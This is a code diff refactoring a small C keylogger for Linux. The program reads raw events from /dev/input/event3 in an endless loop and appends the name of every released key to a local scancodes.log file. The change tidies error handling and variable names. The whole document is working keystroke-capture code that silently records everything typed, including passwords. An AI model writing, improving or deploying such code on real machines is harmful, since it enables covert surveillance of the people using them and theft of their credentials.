@@ -1,10 +1,8 @@
-#include <sys/types.h>
-#include <sys/stat.h>
+#include <errno.h>
 #include <fcntl.h>
 #include <stdio.h>
-#include <errno.h>
 #include <string.h>
-//#include <include/linux/input.h>
+#include <sys/types.h>
 
 struct input_event {
 	struct timeval time;
@@ -117,40 +115,41 @@ int main()
 	init();
 
 	int scancodes_fd = open("./scancodes.log", O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
-	if (scancodes_fd < 0) printf("open scancodes_fd: %s\n", strerror(errno));
-	else printf("scancodes_fd = %d\n", scancodes_fd);
-
-	int fd = open("/dev/input/event3", O_RDONLY);
-	if (fd < 0) printf("open /dev/input/event3: %s\n", strerror(errno));
-	else printf("fd = %d\n", fd);
-	
-	unsigned char characters_to_write;
-	struct input_event buffer;
-
-	int bytes_read = 0;
-	while (1) {
-	 	bytes_read = read(fd, &buffer, sizeof(struct input_event));
-
-		// EV_KEY (include/uapi/linux/input.h)
-		if (buffer.type == 0x01) {
-			if (buffer.value == 0) { // release
-				lseek(scancodes_fd, 0, SEEK_END); // append
-
-				char str[16];
-				sprintf(str, "%s\n", keycodes[buffer.code]);
-				characters_to_write = (int)strlen(keycodes[buffer.code]) + 1;
-				int bytes_written = write(scancodes_fd, str, characters_to_write);
-
-				if (bytes_written < 0) printf("write scancodes_fd: %s\n", strerror(errno));
-			}
-		}
-
-		if (bytes_read < 0) {
-			printf("%s\n", strerror(errno));
-			break;
-		}
+	if (scancodes_fd < 0) {
+		printf("open scancodes_fd: %s\n", strerror(errno));
+		return 1;
 	}
 
+	int input_fd = open("/dev/input/event3", O_RDONLY);
+	if (input_fd < 0) {
+		printf("open /dev/input/event3: %s\n", strerror(errno));
+		return 1;
+	}
+	
+	struct input_event keypress_buffer;
+	char temp_str[16];
+	unsigned char temp_str_length;
+
+	while (1) {
+		if (read(input_fd, &keypress_buffer, sizeof(struct input_event)) < 0) {
+			printf("%s\n", strerror(errno));
+			return 1;
+		}
+
+		if (keypress_buffer.type == 0x01) { // EV_KEY (include/uapi/linux/input.h)
+			if (keypress_buffer.value == 0) { // key release
+				lseek(scancodes_fd, 0, SEEK_END); // append
+
+				sprintf(temp_str, "%s\n", keycodes[keypress_buffer.code]);
+				temp_str_length = (int)strlen(keycodes[keypress_buffer.code]) + 1;
+
+				if (write(scancodes_fd, temp_str, temp_str_length) < 0) {
+					printf("write scancodes_fd: %s\n", strerror(errno));
+					return 1;
+				}
+			}
+		}
+	}
 
 	return 0;
 }
